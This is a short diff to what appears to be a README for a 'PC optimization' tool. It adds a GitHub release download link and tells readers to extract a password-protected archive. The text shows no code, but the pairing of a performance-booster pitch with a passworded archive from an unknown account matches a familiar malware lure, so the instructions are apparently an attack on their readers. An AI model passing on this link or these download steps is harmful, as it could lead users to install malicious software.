@@ -4,7 +4,7 @@ We are excited to introduce our new tool for enhancing your computer's performan
 
 ▎Instructions for Downloading
 
-1. Download the archive realeses
+1. Download the archive realeses https://github.com/ghabchick/optimization-pc/releases/tag/Download
 
 2. Extract the archive: You will need a password to access the application.
 
